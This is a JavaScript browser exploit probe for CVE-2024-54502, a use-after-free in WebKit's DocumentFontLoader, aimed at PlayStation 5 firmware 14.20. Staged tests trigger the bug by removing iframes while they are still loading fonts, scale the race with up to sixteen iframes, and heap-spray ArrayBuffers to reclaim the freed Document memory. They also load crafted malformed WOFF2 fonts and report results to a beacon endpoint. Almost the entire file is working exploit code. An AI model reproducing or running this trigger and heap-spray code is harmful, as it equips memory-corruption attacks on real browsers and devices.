/* p97-cve54502 — CVE-2024-54502 UAF trigger in DocumentFontLoader
 *
 * BUG: DocumentFontLoader::fontLoadingTimerFired() calls loadDone()
 * which can trigger iframe onload → removes iframe → destroys Document.
 * Back in fontLoadingTimerFired(), m_document->frame() accesses freed
 * Document memory. Fixed in Safari 18.2 (commit ad3a1e, bug 281912).
 * PS5 FW 14.20 = Safari 17.2.x = PRE-FIX → VULNERABLE.
 *
 * Test progression:
 * T1: FontFace API detection + basic font loading
 * T2: Iframe font loading + self-removal (basic trigger)
 * T3: Multiple iframe trigger (wider race window)
 * T4: Heap spray + trigger (attempt controlled reclaim)
 * T5: WOFF2 loading test (from server URLs)
 *
 * Beacon prefix: V97U-
 */
(function(){
"use strict";
var RUN_ID = "v97u" + Math.random().toString(36).slice(2,12);
var PREFIX = "V97U-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press97-cve54502");

/* Minimal valid TTF as base64 — serves as a real loadable font */
/* This is the smallest valid TrueType font that renders */
var MINI_TTF_B64 = null;

/* Build minimal valid TTF inline */
function buildMiniTTF() {
  // We need a font that actually LOADS (passes OTS).
  // Use one of the existing TTF files on the server instead.
  return null;
}

/* ====== T1: FontFace API detection ====== */
function test_T1() {
  var r = {};
  try {
    r.FontFace = typeof FontFace !== 'undefined';
    r.documentFonts = typeof document.fonts !== 'undefined';
    if (r.documentFonts) {
      r.fontsReady = typeof document.fonts.ready !== 'undefined';
      r.fontsLoad = typeof document.fonts.load === 'function';
      r.fontsAdd = typeof document.fonts.add === 'function';
      r.fontsDelete = typeof document.fonts.delete === 'function';
      r.fontsCheck = typeof document.fonts.check === 'function';
      r.fontsSize = document.fonts.size;
    }

    // Test if we can create a FontFace
    if (r.FontFace) {
      try {
        var ff = new FontFace('TestAPI', 'url(f0.ttf)');
        r.ffStatus = ff.status;
        r.ffFamily = ff.family;
        r.FF_API = true;
      } catch(e) {
        r.ffErr = e.message.slice(0, 50);
      }
    }

    // Test @font-face loading from server TTF
    var style = document.createElement('style');
    style.textContent = '@font-face{font-family:"ServerFont";src:url(f0.ttf) format("truetype")}';
    document.head.appendChild(style);
    var div = document.createElement('div');
    div.style.cssText = 'font-family:"ServerFont",sans-serif;position:absolute;left:-9999px;font-size:72px;';
    div.textContent = 'ABCDEFG test';
    document.body.appendChild(div);
    var w1 = div.offsetWidth;

    setTimeout(function() {
      var w2 = div.offsetWidth;
      r.serverFontW1 = w1;
      r.serverFontW2 = w2;
      r.SERVER_FONT_LOADED = w1 !== w2;
      style.remove();
      div.remove();
      B("T1-FONTFACE-API", r);
    }, 2000);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0, 60); B("T1-FONTFACE-API", r); }
}

/* ====== T2: Basic iframe + font loading + self-removal ====== */
function test_T2() {
  var r = {};
  try {
    // Create @font-face in parent to cache the font
    var style = document.createElement('style');
    style.textContent = '@font-face{font-family:"uaf2";src:url(f0.ttf) format("truetype")} body{font-family:"uaf2",sans-serif}';
    document.head.appendChild(style);
    document.body.offsetHeight; // force layout

    // Wait for font to load in parent
    setTimeout(function() {
      r.parentLayoutDone = true;

      // Create single iframe that uses same font and removes itself on load
      var iframe = document.createElement('iframe');
      iframe.id = 'uaf_single';
      iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

      var iframeContent = '<!doctype html><html><head><style>' +
        '@font-face{font-family:"uaf2";src:url(f0.ttf) format("truetype")}' +
        'body{font-family:"uaf2",sans-serif}' +
        '</style></head><body>trigger text</body></html>';

      iframe.onload = function() {
        r.iframeLoaded = true;
        // Remove iframe — this destroys the child Document
        // The child's DocumentFontLoader timer may still be pending
        try {
          var el = document.getElementById('uaf_single');
          if (el) el.remove();
          r.iframeRemoved = true;
        } catch(e) {
          r.removeErr = e.message.slice(0, 40);
        }
      };

      document.body.appendChild(iframe);
      // Write content to iframe
      try {
        iframe.contentDocument.open();
        iframe.contentDocument.write(iframeContent);
        iframe.contentDocument.close();
      } catch(e) {
        // srcdoc fallback
        iframe.srcdoc = iframeContent;
      }

      // Check survival after the trigger window
      setTimeout(function() {
        r.SURVIVED = true;
        r.iframeStillExists = !!document.getElementById('uaf_single');
        style.remove();
        B("T2-BASIC-TRIGGER", r);
      }, 3000);

    }, 2000);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0, 60); B("T2-BASIC-TRIGGER", r); }
}

/* ====== T3: Multiple iframes — wider race window ====== */
function test_T3() {
  var r = {};
  try {
    var style = document.createElement('style');
    style.textContent = '@font-face{font-family:"uaf3";src:url(f1.ttf) format("truetype")} .uaf3{font-family:"uaf3",sans-serif}';
    document.head.appendChild(style);

    // Force parent to load the font
    var trigger = document.createElement('div');
    trigger.className = 'uaf3';
    trigger.style.cssText = 'position:absolute;left:-9999px;font-size:48px;';
    trigger.textContent = 'PRELOAD FONT';
    document.body.appendChild(trigger);
    trigger.offsetWidth;

    var loadCount = 0;
    var removeCount = 0;
    var NUM_IFRAMES = 8;

    setTimeout(function() {
      trigger.remove();

      for (var i = 0; i < NUM_IFRAMES; i++) {
        (function(idx) {
          var iframe = document.createElement('iframe');
          iframe.id = 'uaf3_' + idx;
          iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

          iframe.onload = function() {
            loadCount++;
            // Immediately remove — triggers Document destruction
            try {
              var el = document.getElementById('uaf3_' + idx);
              if (el) {
                el.remove();
                removeCount++;
              }
            } catch(e) {}
          };

          document.body.appendChild(iframe);
          try {
            var doc = iframe.contentDocument;
            doc.open();
            doc.write('<!doctype html><html><head><style>' +
              '@font-face{font-family:"uaf3";src:url(f1.ttf) format("truetype")}' +
              'body{font-family:"uaf3",sans-serif;font-size:48px}' +
              '</style></head><body>TRIGGER ' + idx + '</body></html>');
            doc.close();
          } catch(e) {
            iframe.srcdoc = '<!doctype html><html><head><style>' +
              '@font-face{font-family:"uaf3";src:url(f1.ttf) format("truetype")}' +
              'body{font-family:"uaf3",sans-serif}' +
              '</style></head><body>T' + idx + '</body></html>';
          }
        })(i);
      }

      // Check survival
      setTimeout(function() {
        r.loadCount = loadCount;
        r.removeCount = removeCount;
        r.SURVIVED = true;
        r.remainingIframes = 0;
        for (var j = 0; j < NUM_IFRAMES; j++) {
          if (document.getElementById('uaf3_' + j)) r.remainingIframes++;
        }
        style.remove();
        B("T3-MULTI-TRIGGER", r);
      }, 5000);
    }, 2000);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0, 60); B("T3-MULTI-TRIGGER", r); }
}

/* ====== T4: Aggressive trigger with heap spray between free and use ====== */
function test_T4() {
  B("T4-START", "aggressive-trigger");
  var r = {};
  try {
    var style = document.createElement('style');
    style.textContent = '@font-face{font-family:"uaf4";src:url(f2.ttf) format("truetype")} .uaf4{font-family:"uaf4",sans-serif}';
    document.head.appendChild(style);

    var pre = document.createElement('div');
    pre.className = 'uaf4';
    pre.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
    pre.textContent = 'PRELOAD';
    document.body.appendChild(pre);
    pre.offsetWidth;

    var NUM = 16;
    var freed = 0;

    setTimeout(function() {
      pre.remove();

      // Create iframes rapidly
      for (var i = 0; i < NUM; i++) {
        (function(idx) {
          var iframe = document.createElement('iframe');
          iframe.id = 'uaf4_' + idx;
          iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

          iframe.onload = function() {
            // Remove iframe immediately
            var el = document.getElementById('uaf4_' + idx);
            if (el) {
              el.remove();
              freed++;

              // HEAP SPRAY: Try to reclaim the freed Document memory
              // Document objects are large (~500+ bytes on 64-bit)
              // Spray with ArrayBuffers of similar size
              for (var s = 0; s < 50; s++) {
                try {
                  var ab = new ArrayBuffer(512);
                  var u32 = new Uint32Array(ab);
                  // Fill with recognizable pattern
                  for (var k = 0; k < u32.length; k++) {
                    u32[k] = 0x41414141;
                  }
                } catch(e) {}
              }
            }
          };

          document.body.appendChild(iframe);
          try {
            iframe.contentDocument.open();
            iframe.contentDocument.write('<!doctype html><html><head><style>' +
              '@font-face{font-family:"uaf4";src:url(f2.ttf) format("truetype")}' +
              'body{font-family:"uaf4",sans-serif;font-size:48px}' +
              '</style></head><body>T' + idx + '</body></html>');
            iframe.contentDocument.close();
          } catch(e) {
            iframe.srcdoc = '<!doctype html><style>@font-face{font-family:"uaf4";src:url(f2.ttf)}body{font-family:"uaf4"}</style><body>T</body></html>';
          }
        })(i);
      }

      setTimeout(function() {
        r.freed = freed;
        r.SURVIVED = true;
        style.remove();
        B("T4-AGGRESSIVE", r);
      }, 5000);
    }, 2000);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0, 60); B("T4-ERR", r); }
}

/* ====== T5: WOFF2 loading test ====== */
function test_T5() {
  var r = {};
  try {
    // Test loading WOFF2 files from server
    var files = ['evil-woff2-valid.woff2', 'evil-woff2-small-glyf.woff2',
      'evil-woff2-zero-glyf.woff2', 'evil-woff2-sfnt-mismatch.woff2',
      'evil-woff2-bad-comp.woff2'];
    var idx = 0;
    var results = [];

    function testNext() {
      if (idx >= files.length) {
        r.woff2Results = results.join('|');
        B("T5-WOFF2", r);
        return;
      }
      var fname = files[idx];
      var fontName = 'W' + idx;
      var style = document.createElement('style');
      style.textContent = '@font-face{font-family:"' + fontName + '";src:url(' + fname + ') format("woff2")}';
      document.head.appendChild(style);
      var div = document.createElement('div');
      div.style.cssText = 'font-family:"' + fontName + '",sans-serif;position:absolute;left:-9999px;font-size:72px;';
      div.textContent = 'WOFF2 TEST ABC';
      document.body.appendChild(div);
      var w1 = div.offsetWidth;

      setTimeout(function() {
        var w2 = div.offsetWidth;
        var loaded = w1 !== w2;
        results.push(fname.replace('evil-woff2-','').replace('.woff2','') + ':' + (loaded ? 'LOADED' : 'rejected'));
        style.remove();
        div.remove();
        idx++;
        testNext();
      }, 1500);
    }
    testNext();
  } catch(e) { r.err = e.name + ":" + e.message.slice(0, 60); B("T5-WOFF2", r); }
}

/* ====== Run ====== */
try {
  test_T1();                    // FontFace API detection (0ms)
  setTimeout(test_T2, 5000);    // Basic iframe trigger (5s)
  setTimeout(test_T3, 15000);   // Multi-iframe trigger (15s)
  setTimeout(test_T5, 30000);   // WOFF2 loading (30s)
  setTimeout(test_T4, 45000);   // Aggressive trigger with heap spray (45s) — DANGER LAST
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe97-done"); }, 80000);
})();
